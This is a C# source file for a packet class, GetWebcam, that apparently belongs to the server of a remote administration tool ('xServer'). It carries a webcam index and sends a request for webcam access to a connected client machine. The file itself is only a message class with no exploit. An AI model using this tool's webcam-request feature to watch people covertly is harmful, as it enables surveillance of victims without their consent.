﻿using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetWebcam : IPacket
    {
        public int Webcam { get; set; }

        public GetWebcam()
        {
        }

        public GetWebcam(int webcam)
        {
            this.Webcam = webcam;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}